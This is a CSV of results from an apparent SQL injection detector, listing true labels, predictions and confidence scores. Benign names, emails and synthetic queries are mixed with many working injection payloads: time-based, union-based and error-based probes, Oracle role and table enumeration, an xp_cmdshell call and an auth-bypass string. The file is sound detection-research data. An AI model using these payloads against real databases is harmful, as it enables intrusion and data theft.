text,true_label,predicted_label,confidence_sql_injection
gasull vadell,0,0,0.004468253314358248
donadio_honig@donkr.zr,0,0,0.004468253314358248
dueas cristaldo,0,0,0.004468253314358248
1'  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  ) ,1,1,0.99
"-3933'   )    )     )   union all select 6198,6198,6198,6198,6198#",1,1,1.0
17403,0,0,0.004468253314358248
"  select soilid as id, muscle as many from band",0,0,0.0
select count ( especially )  from nodded,0,0,0.0
culubret lluss,0,0,0.004468253314358248
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  +'",1,1,1.0
pawley@santacruzdelvoto.vu,0,0,0.004468253314358248
"1' and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and 'rupq'  =  'rupq",1,1,1.0
1'   )    )     )   and 4595  =  4595#,1,1,1.0
23734,0,0,0.004468253314358248
1' in boolean mode  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,1,1,1.0
"1"" union all select null,null,null,null,null,null,null,null--",1,1,1.0
select * from  ( select dull from wire ) ,0,0,0.0
"-2959"" union all select 3414,3414,3414,3414,3414,3414,3414,3414#",1,1,1.0
recomendaci$n,0,0,0.012968046660272936
"  select direction,engine from kitchen where want = 'yes' union select shut, even from behavior",0,0,0.0
select * from remove where indicate between copper09/01/1996them and easier15/31/1996couple,0,0,0.0
"-1164""  )   union all select 6617,6617,6617,6617,6617,6617--",1,1,1.0
ambiental,0,0,0.004468253314358248
81451206h,0,0,0.004468253314358248
2366,0,0,0.004468253314358248
select * from thread where    not eleven = 'worse',0,0,0.0
select egg ( s )  from substance select shot from manufacturing,0,0,0.0
" select * from users where id  =  1 +   (  \+  )   union select null,@@version -- 1",1,1,1.0
"   select shippers.shippername, count ( orders.orderid )  as numberoforders from    ordersleft join shippers on orders.shipperid  =  shippers.shipperid  group by shippername;",0,0,0.0
5.84996e+15,0,0,0.0
select * from hearing where price not between 10 and 20,0,0,0.0
"1  )   where 1185  =  1185 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",1,1,1.0
select count ( distinct soldier )  from ourselves,0,0,0.0
" select column_name ( s )  from drink,bank",0,0,0.0
1' where 7613  =  7613,1,1,1.0
select top 3 * from tune select * from feel 3select * from statement,0,0,0.0
alpuche simani,0,0,0.004468253314358248
select * from coal where foot = 'above' fetch first 3 rows only,0,0,0.0
select * from  ( select somehow from rain ) ,0,0,0.0
hanley,0,0,0.004468253314358248
1%'   )    )     )   rlike sleep  (  5  )  #,1,1,1.0
6085,0,0,0.004468253314358248
66750565b,0,0,0.004468253314358248
select   (  case when   (  5847  =  2826  )   then 5847 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1,1,1.0
"1',  (  select   (  case when   (  3902  =  3902  )   then   (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   else 1/  (  select 0 from dual  )   end  )   from dual  )  ",1,1,1.0
"faus 195,",0,0,0.004468253314358248
-8515' or 1329  =  9536,1,1,1.0
"-9445  )   as dmur where 4371  =  4371 union all select 4371,4371,4371,4371,4371,4371,4371,4371,4371,4371#",1,1,1.0
"1'   )    )     )   union all select null,null,null,null,null,null,null,null,null,null--",1,1,1.0
-7404' where 1536  =  1536 order by 1#,1,1,0.99
"1""  )   as gffq where 4387  =  4387 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --",1,1,1.0
cerpa oitavn,0,0,0.004468253314358248
select distinct art from if,0,0,0.02
"-1763%"" or   (  8459  =  8459  )  *4906 and ""%""  =  """,1,1,0.99
"   select stranger,studying,minute,process,smaller     (  (  specific join means on order.loss =  correctly.sort )   inner join droppedon orders.plenty =  home.justid ) ",0,0,0.03
cufre sans,0,0,0.004468253314358248
1 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,1,1,1.0
8.2197e+15,0,0,0.0
"1 and elt  (  1210  =  1210,sleep  (  5   )    )   ",1,1,1.0
"1""  )   as tuem where 1328  =  1328",1,1,1.0
"1'   )    )     )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'cfhi' like 'cfhi",1,1,1.0
"select atan ( -0.8, 2 ) ;",0,0,0.0
"-2855""   )    )     )   union all select 1496,1496,1496,1496#",1,1,1.0
roco@forohh.ge,0,0,0.004468253314358248
"-3359 union all select 4675,4675,4675--",1,1,1.0
-2316'   )    )     )   or 8519  =  6010,1,1,1.0
1  )   as rlft where 1670  =  1670 waitfor delay '0:0:5'--,1,1,1.0
"1""  )   union all select null,null,null,null,null,null,null--",1,1,1.0
select * from exciting fetch first 50 percent rows only,0,0,0.0
sprouse,0,0,0.004468253314358248
1   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (     (  1601  =  1601,1,1,1.0
select avg ( bark ) from minerals select sum ( brown ) ,0,0,0.0
50700,0,0,0.004468253314358248
enratonarse,0,0,0.004468253314358248
1   )    )    as qgma where 7675  =  7675 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,1,1,1.0
"1%""  )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and   (  ""%""  =  """,1,1,1.0
-1217'   )    )     )   order by 1#,1,1,1.0
he53e9ona,0,0,0.004468253314358248
select avg ( price ) from forward,0,0,0.0
select avg ( faster ) from seldom select sum ( rain ) ,0,0,0.0
"1"" and 9198  =  9198--",1,1,1.0
"-8258""   )    )    as swjp where 2681  =  2681 union all select 2681,2681,2681,2681,2681,2681--",1,1,1.0
-6567'   )    )    union all select 3217#,1,1,1.0
"1'  )   where 6081  =  6081 union all select null,null,null,null,null,null,null,null,null--",1,1,1.0
select case when 7951  =  1147 then 1 else null end--,1,1,1.0
1   )    )     )   and sleep  (  5  )   and    (    (     (  6618  =  6618,1,1,1.0
06434691g,0,0,0.004468253314358248
"1""  )   as bpmk where 6412  =  6412 union all select null,null,null,null#",1,1,1.0
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  'qfls'  =  'qfls",1,1,1.0
select count ( * )  as route,0,0,0.0
select min ( condition )  as sand from tent,0,0,0.0
tordellego,0,0,0.004468253314358248
1'+  (  select 'jmdl' where 7827  =  7827,1,1,1.0
-3431%'  )   or 9323  =  9323#,1,1,1.0
1'+  (  select 'gtqr' where 5660  =  5660,1,1,1.0
-5217 where 3620  =  3620 or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,1,1,1.0
uriz carmona,0,0,0.004468253314358248
"1""   )    )    as dshc where 9911  =  9911 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,1,1.0
hache6,0,0,0.004468253314358248
van_eyk,0,0,0.004468253314358248
"1""  )   as htyo where 8322  =  8322 and 4595  =  4595#",1,1,0.9916666666666666
"  select once,meat,hat from only left join orders on either.sleptid =  to.poetry order by rocky.faster",0,0,0.0
"1%"" and 6408  =  7959--",1,1,1.0
1' where 5035  =  5035 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,1,1,1.0
"1""   )    )    procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (   ""nzhj"" like ""nzhj",1,1,1.0
select min ( wooden )  as sight from valuable,0,0,0.0
tronchuda,0,0,0.004468253314358248
"  select * from harbor where butter in  ( 'correct', 'gain', 'load' )  ",0,0,0.0
hetera,0,0,0.004468253314358248
select avg ( mix ) from write select sum ( harder ) ,0,0,0.0
alcolea,0,0,0.004468253314358248
select * from heavy fetch first 50 percent rows only,0,0,0.0
" select * from electric order by mainly, sort",0,0,0.0
select top from older union select married from way order by airplane,0,0,0.0
select count ( * )  as noon,0,0,0.0
"  select * from missing where fairly not in  ( 'father', 'industry', 'travel' )  ",0,0,0.0
-3088' or 6872  =  6872 and 'miwk'  =  'miwk,1,1,1.0
select distinct rose from public,0,0,0.0
select * from region where pattern like '%take%',0,0,0.0
or 'unusual'   =   'unusual',1,1,1.0
"1"" where 6023  =  6023",1,1,1.0
select avg ( noted ) from key,0,0,0.0
"select term_id, meta_key, meta_value from wp_termmeta where term_id in  ( 2712,3146,3152,2720,3078,2766,2679 )  order by meta_id asc",0,0,0.0
"1%'   )    )     )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  '%'  =  '",1,1,1.0
sweldund-pasetti@supercover.lt,0,0,0.006527024015406931
select * from wing where captain = 'man' limit 3,0,0,0.0
select   (  case when   (  8350  =  7872  )   then 8350 else 8350*  (  select 8350 from information_schema.character_sets  )   end  )  #,1,1,1.0
"1"" where 8016  =  8016",1,1,1.0
"  select health as quite, border as [duty]  from musical",0,0,0.0
select count ( thouid ) from chamber,0,0,0.0
paley,0,0,0.004468253314358248
select * from party where announced between 'trail' and 'forest',0,0,0.0
sangres,0,0,0.004468253314358248
"  select seriousid as id, law as doll from view",0,0,0.0
de las muecas pedrol,0,0,0.0
7118,0,0,0.004468253314358248
"   select decide, cattle, daughter from ants where organization  is null",0,0,0.0
"lugar higuera canaria, 169",0,0,0.004468253314358248
select top 3 * from instant,0,0,0.0
"1""   )    )     )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  ""buwe""  =  ""buwe",1,1,1.0
select bright ( s )  from nation union,0,0,0.0
"-6095""  )   as hygc where 8142  =  8142 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1,1,1.0
"  update effort set noise =  'process', city =  'smaller' where strong =  sets",0,0,0.0
"-5148""   )    )    or 5310  =  8229",1,1,1.0
if  (  3245  =  6168  )   select 3245 else drop function nafj--,1,1,1.0
"1',  (  case when 5204  =  2136 then 1 else null end  )  ",1,1,1.0
t'exec master..xp_cmdshell 'nslookup www.google.com'--,1,1,0.92
"   select form, copy, sawfrom why where fat  is not null",0,0,0.0
"select instr ( ""w3schools.com"", ""com"" )  as matchposition;",0,0,0.0
select sleep  (  5   )    )   ||',1,1,0.98
"1%' and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",1,1,1.0
spaeth@directoriogratuito.kr,0,0,0.004468253314358248
"1"" and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and ""vukd""  =  ""vukd",1,1,1.0
select top 3 * from careful where interest = 'beyond' select * from fence,0,0,0.0
"""  )  ;waitfor delay '0:0:__time__'--",1,1,0.95
select top 3 * from drew,0,0,0.0
select * from park where tried  between 10 and 20,0,0,0.0
select * from can  where widely not like '[meant]%',0,0,0.0
"1'+  (  select 'jhce' where 1117  =  1117 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   +'",1,1,1.0
"select post_id, meta_key, meta_value from wp_postmeta where post_id in  ( 21 )  order by meta_id asc",0,0,0.01
-2036'  )   or   (  8459  =  8459  )  *4906 and   (  'hjeu'  =  'hjeu,1,1,1.0
cella,0,0,0.004468253314358248
julieta,0,0,0.004468253314358248
"1""   )    )     )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  ""obau""  =  ""obau",1,1,1.0
"1 where 3799  =  3799 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1,1,1.0
"1' where 1272  =  1272 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",1,1,1.0
"1'+  (  select rqcw where 9002  =  9002 union all select null,null,null,null,null,null,null,null,null#",1,1,1.0
"1 where 2751  =  2751 union all select null,null,null,null--",1,1,1.0
select * from rice where forget = 'shout',0,0,0.0
1'+  (  select 'kiqf' where 5920  =  5920,1,1,1.0
"  select orders.shadowrid, employees.becoming, employees.please from ordersright join employees on orders.employeeid  =  employees.seeid order by orders.nestid",0,0,0.0
"  select until,bill from chamber where system = 'voice' union select only, pay from battle",0,0,0.0
select top 3 * from several where stomach = 'letter' select * from any,0,0,0.0
"-5182""   )    )    or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1,1,1.0
"1""   )    )    as rfgu where 4880  =  4880 union all select null,null,null,null,null,null,null,null,null--",1,1,1.0
ferris,0,0,0.004468253314358248
"1"" where 9901  =  9901 and   (  2455  =  8499  )  *8499--",1,1,0.99
"1""   )    )    as rhea where 2982  =  2982 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  --",1,1,1.0
bscones de ojeda,0,0,0.0
magdiel,0,0,0.004468253314358248
select * from sit,0,0,0.0
select * from tales where mark = 'curious'  or out = 'damage',0,0,0.0
"1""  )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  ""bmbg"" like ""bmbg",1,1,1.0
"  select enemyid as id, kill as ride from dollar",0,0,0.0
8759,0,0,0.004468253314358248
delete from engine where size = 'straight',0,0,0.0
select * from population order by page desc,0,0,0.0
" select * from users where id  =  '1' or \<   =  1 union select 1,@@version -- 1'",1,1,1.0
"   select remove, per, handfrom consist where twenty  is not null",0,0,0.0
-8999'   )    )     )   or 6872  =  6872 and    (    (     (  'jare'  =  'jare,1,1,1.0
1'  )   and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  'lnte'  =  'lnte,1,1,1.0
select top 50 percent * from prepare,0,0,0.0
-4900'   )    )    or 7208  =  3236,1,1,1.0
"1   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  4510  =  4510",1,1,1.0
select top 3 * from flies,0,0,0.0
"select post_id, meta_key, meta_value from wp_postmeta where post_id in  ( 189 )  order by meta_id asc",0,0,0.0
select count ( something ) from driving,0,0,0.0
28815,0,0,0.004468253314358248
"   select sink, trade, men from fine where move  is null",0,0,0.0
almazn cayul,0,0,0.004468253314358248
select * from layers fetch first 3 rows only select top 50 percent * from below,0,0,0.0
"1'  )   and elt  (  3114  =  3114,sleep  (  5   )    )   #",1,1,1.0
select * from difference 3 select * from snow,0,0,0.0
"1'  )   where 6388  =  6388 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,1,1.0
basilia,0,0,0.004468253314358248
1  )   where 2083  =  2083,1,1,1.0
select distinct wonderful from courage,0,0,0.0
03291016s,0,0,0.004468253314358248
"-2007%'   )    )    union all select 7298,7298,7298#",1,1,1.0
"-2276""   )    )    as qwow where 2321  =  2321 or 3534  =  2971--",1,1,1.0
fluvia,0,0,0.004468253314358248
"1'||  (  select 'ssvp' where 3300  =  3300 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,1,1.0
afiligr*anado,0,0,0.0
"1""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  ""cneo"" like ""cneo",1,1,1.0
select * from  ( select verb from occasionally ) ,0,0,0.0
"-2216""  )   where 6692  =  6692 union all select 6692,6692,6692#",1,1,1.0
"-1051""  )   where 6586  =  6586 or 6647  =  6738#",1,1,0.99
"-9240' union all select 6538,6538,6538#",1,1,1.0
select * from base fetch first 3 rows only select top 50 percent * from limited,0,0,0.0
"1'||  (  select 'frrk' from dual where 3145  =  3145 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )     )  ||'",1,1,1.0
select   (  case when   (  9030  =  9185  )   then 9030 else 9030*  (  select 9030 from information_schema.character_sets  )   end  )  #,1,1,1.0
sitiwet-chagas@creacionesacampada.travel,0,0,0.010162907268170427
-3450' where 4478  =  4478 or 9323  =  9323#,1,1,0.99
8534,0,0,0.004468253314358248
1%' or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,1,1,0.99
"1"" where 5845  =  5845 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,1,1.0
"   select skill, from, thumb from street where poetry  is null",0,0,0.0
exigidad,0,0,0.004468253314358248
select * from hope where seven = 'solid' fetch first 3 rows only,0,0,0.0
"cuerlas, las",0,0,0.004468253314358248
"1'+  (  select luwn where 1214  =  1214 union all select null,null,null,null,null,null#",1,1,1.0
3.62194e+15,0,0,0.0
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (   ""swec"" like ""swec",1,1,1.0
"  select wasteid as id, surprise as morning from whole",0,0,0.0
10836981w,0,0,0.004468253314358248
siku@tartasconamor.in,0,0,0.001423800461630333
-7726 or 3038  =  3038,1,1,0.98
"-9384%"" union all select 7031,7031,7031,7031,7031,7031,7031,7031,7031#",1,1,1.0
cartaya,0,0,0.004468253314358248
comba,0,0,0.004468253314358248
78260205z,0,0,0.004468253314358248
select avg ( lower )  from lunch  select sum ( time ) ,0,0,0.0
select avg ( imagine ) from directly,0,0,0.0
kangelis,0,0,0.004468253314358248
"select pg_sleep  (  5  )   and ""zhsc""  =  ""zhsc",1,1,0.97
"c/ don bosco 65, 10-d",0,0,0.0
select * from children 3 select * from desert,0,0,0.0
-4323'   )    )    or 6968  =  1393,1,1,1.0
"   select enjoy, necessary, sentence from grain where wrong  is null",0,0,0.0
"1   )    )    or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (   8048  =  8048",1,1,1.0
7.73869e+15,0,0,0.0
select * from promised fetch first 3 rows only,0,0,0.0
1  )   where 8232  =  8232 and   (  3020  =  3020  )  *6703--,1,1,1.0
"1%""   )    )    or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",1,1,1.0
52310665v,0,0,0.004468253314358248
"1'   )    )    or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   'gxpr'  =  'gxpr",1,1,1.0
" select * from laugh order by until asc, grandmother desc",0,0,0.0
"1%""   )    )    and 6283  =  2068 and    (    (   ""%""  =  """,1,1,1.0
" and 1  =  utl_inaddr.get_host_address   (    (   select distinct  (  granted_role  )   from   (  select distinct  (  granted_role  )  , rownum as limit from dba_role_privs where grantee  =  sys.loginuser  )   where limit  =  4   )    )    and 'i'  =  'i",1,1,1.0
"1""   )    )     )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (     (  ""asvy""  =  ""asvy",1,1,1.0
6180,0,0,0.004468253314358248
or sleep  (  __time__  )    =  ',1,1,0.97
"select post_id, meta_key, meta_value from wp_postmeta where post_id in  ( 11451 )  order by meta_id asc",0,0,0.0
"-7812'  )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  'ttvo'  =  'ttvo",1,1,1.0
"-9749"" where 7083  =  7083 or make_set  (  7577  =  1182,1182  )  --",1,1,1.0
"admin"" or 1  =  1--",1,1,1.0
union all select,1,1,0.83
"insert into double ( visitor, sure, donkey, nuts, soldier, press )  values  ( 'handle', 'off'. horn', 'brave', 'thirty', 'square', 'stove' )  ",0,0,0.0
select feet ( s )  from spirit select instant from pay,0,0,0.0
select * from users where id  =  1 %$ 1 or 1  =  1 -- 1,1,1,1.0
"  select shallid as id, pipe as prove from sweet",0,0,0.0
-4428  )   or 3038  =  3038,1,1,1.0
1  )   where 2232  =  2232,1,1,1.0
1'+  (  select wpai where 3685  =  3685,1,1,1.0
gupton,0,0,0.004468253314358248
"insert into gold ( twice, else, post, direct, favorite, wear )  values  ( 'shelf', 'sum'. bent', 'merely', 'struggle', 'great', 'longer' )  ",0,0,0.05
21700,0,0,0.004468253314358248
select top 3 * from limited select * from wave 3select * from cent,0,0,0.0
rivalee,0,0,0.004468253314358248
"   select employees.tomorrow, count ( orders.silenceid )  as heardfrom    ( ordersinner join store on orders.islandid  =  employees.elseid ) ",0,0,0.0
consell,0,0,0.004468253314358248
"1   )    )    or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   9333  =  9333",1,1,1.0
93310194e,0,0,0.004468253314358248
select apart,0,0,0.00024957571886764606
select * from southern where almost = 'broken' limit 3,0,0,0.0
cabrer gascon,0,0,0.004468253314358248
select count ( * )  as studying,0,0,0.0
duplan,0,0,0.004468253314358248
select * from review where torn in  ( select service from invented ) ,0,0,0.0
select region ( s ) from aware inner join,0,0,0.0
6246,0,0,0.004468253314358248
select * from definition,0,0,0.0
1.72e+15,0,0,0.0
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  3044  =  3044",1,1,1.0
"1"" and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and ""xhvo""  =  ""xhvo",1,1,1.0
"-3782%""  )   or make_set  (  9354  =  9354,7185  )   and   (  ""%""  =  """,1,1,1.0
delete from roof where heat = 'mine',0,0,0.0
j804n86o,0,0,0.004468253314358248
"1""  )   as ubva where 6369  =  6369 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,1,1.0
"  select orders.relationshiprid, employees.press, employees.natural from ordersright join employees on orders.employeeid  =  employees.planningid order by orders.dogid",0,0,0.0
 update pour set busy = 'sent'where drawn = 'important',0,0,0.0
caball,0,0,0.004468253314358248
" select column_name ( s )  from cream,sit",0,0,0.0
" and 1  =  utl_inaddr.get_host_address   (    (   select distinct  (  table_name  )   from   (  select distinct  (  table_name  )  , rownum as limit from sys.all_tables  )   where limit  =  7   )    )    and 'i'  =  'i",1,1,1.0
"1%'  )   union all select null,null,null,null#",1,1,1.0
select * from individual where situation not like 'ship%',0,0,0.0
select * from farm where split not between 'settlers' and 'flat',0,0,0.0
select * from bottom where clear = 'underline' limit 3,0,0,0.0
select count ( * )  as badly,0,0,0.0
pagny@cpanelweb.yu,0,0,0.004468253314358248
"   select count ( here ) , silver from double by toy",0,0,0.0
tebbe,0,0,0.004468253314358248
" select column_name ( s )  from natural,brother",0,0,0.0
-9014' order by 1--,1,1,1.0
"1""  )   where 2758  =  2758 union all select null,null,null,null,null,null,null--",1,1,1.0
select number ( s )  from here full outer join,0,0,0.0
"1'   )    )     )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  'tzrd'  =  'tzrd",1,1,1.0
"1'+  (  select qmez where 3729  =  3729 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,1,1.0
select top 50 percent * from went select * from that fetch first 50 percent rows onlyselect top 3 * from ear,0,0,0.0
"el reyezuelo, 15",0,0,0.0
"-7676""   )    )    as flov where 7967  =  7967 union all select 7967--",1,1,1.0
"1'+  (  select 'mxei' where 7811  =  7811 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1,1,1.0
1'   )    )    and 2401  =  4693 and    (    (   'ssrm'  =  'ssrm,1,1,1.0
siefert,0,0,0.004468253314358248
"-3137'||  (  select 'btif' where 1718  =  1718 union all select 1718,1718,1718,1718,1718,1718,1718,1718,1718#",1,1,1.0
"1%""   )    )     )   and 7533  =  7533 and    (    (     (  ""%""  =  """,1,1,1.0
"-9659   )    )     )   union all select 8665,8665,8665,8665,8665,8665,8665--",1,1,1.0
select * from food,0,0,0.0
" select * from users where id  =  1 or \+<$ union select 1,@@version -- 1",1,1,1.0
"1'+  (  select 'vedi' where 2774  =  2774 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,1,1.0
-3881   )    )     )   union all select 4438--,1,1,1.0
select paper from corn,0,0,0.0
-2920'   )    )    or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'rzey'  =  'rzey,1,1,1.0
4.46161e+14,0,0,0.0
select * from wp_posts where id  =  262331 limit 1,0,0,0.0
bilal,0,0,0.004468253314358248
select * from customers where rownum < =  3;,0,0,0.02
" select * from strong order by said asc, yard desc",0,0,0.0
artenio,0,0,0.004468253314358248
reski.kuberskaya@n340magazin.no,0,0,0.0002378417525869997
pruja lantadilla,0,0,0.004468253314358248
"waitfor delay '0:0:5' and    (    (   ""ykgm""  =  ""ykgm",1,1,1.0
"1 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  # fzni",1,1,1.0
select * from farmer where replace = 'split' fetch first 3 rows only,0,0,0.0
"  select frozen as pen, seat as [mistake]  from standard",0,0,0.0
select * from forth where price not between 10 and 20,0,0,0.0
"1""  )   where 2136  =  2136 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,1,1.0
"   select class, fast, offer from beside where arrive  is null",0,0,0.0
select orange ( s )  from wing union all,0,0,0.0
sa89gn,0,0,0.004468253314358248
delvalle llers,0,0,0.004468253314358248
1'   )    )     )   and 1743  =  6793 and    (    (     (  'rgcv'  =  'rgcv,1,1,1.0
select * from become where spend between '1996-07-01' and '1996-07-31',0,0,0.0
select protection from riding,0,0,0.0
"1""   )    )    as swix where 2459  =  2459 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",1,1,1.0
1'+  (  select 'luhy' where 3112  =  3112 and   (  3020  =  3020  )  *6703  )  +',1,1,0.99
1'  )   as uwmy where 6980  =  6980,1,1,1.0
"  select screenid as id, tiny as swimming from become",0,0,0.0
select * from except where not has = 'somebody'  and not perfect = 'foreign',0,0,0.0
"select * from train where with between ""dull"" and    ""period""",0,0,0.0
"1""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  ""lsis"" like ""lsis",1,1,1.0
villodrigo,0,0,0.004468253314358248
"1""  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  ""rwlq""  =  ""rwlq",1,1,1.0
ellston balladares,0,0,0.004468253314358248
select * from  ( select under from reason ) ,0,0,0.0
47239,0,0,0.004468253314358248
select count ( whom ) from pattern,0,0,0.0
cote suengas,0,0,0.004468253314358248
"1%"" or elt  (  5873  =  5873,sleep  (  5   )    )   #",1,1,1.0
mediona,0,0,0.004468253314358248
"-1988 where 4597  =  4597 union all select 4597,4597,4597,4597,4597,4597--",1,1,1.0
"  select oil,airplane,wool from term left join orders on shop.nutsid =  in.whenever order by held.wish",0,0,0.0
select * from fellow  where for not like '[steam]%',0,0,0.0
"  select * from tell where your in  ( 'faster', 'on', 'are' )  ",0,0,0.03
select avg ( price ) from cap,0,0,0.0
select count ( * )  as exactly,0,0,0.0
